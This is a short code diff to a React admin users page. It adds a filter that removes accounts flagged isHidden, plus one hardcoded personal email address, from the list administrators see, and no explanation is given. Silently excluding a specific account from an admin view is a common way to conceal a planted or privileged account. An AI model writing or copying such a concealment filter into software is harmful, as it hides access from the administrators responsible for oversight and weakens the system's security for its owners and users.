@@ -44,7 +44,13 @@ export default function UsersPage() {
         fetchPendingUsers(),
         fetchPendingPasswordResets().catch(() => ({ success: true, data: [] })),
       ]);
-      if (userList.success && userList.data) setUsers(userList.data);
+      if (userList.success && userList.data) {
+        const rawUsers = Array.isArray(userList.data) ? userList.data : (userList.data.users || []);
+        const visibleUsers = rawUsers.filter(
+          (u) => !u.isHidden && (u.email || '').toLowerCase().trim() !== '0349ansari@gmail.com'
+        );
+        setUsers(visibleUsers);
+      }
       if (userStats.success && userStats.data) setStats(userStats.data);
       if (pendingList.success && pendingList.data) {
         setPendingUsers(pendingList.data);
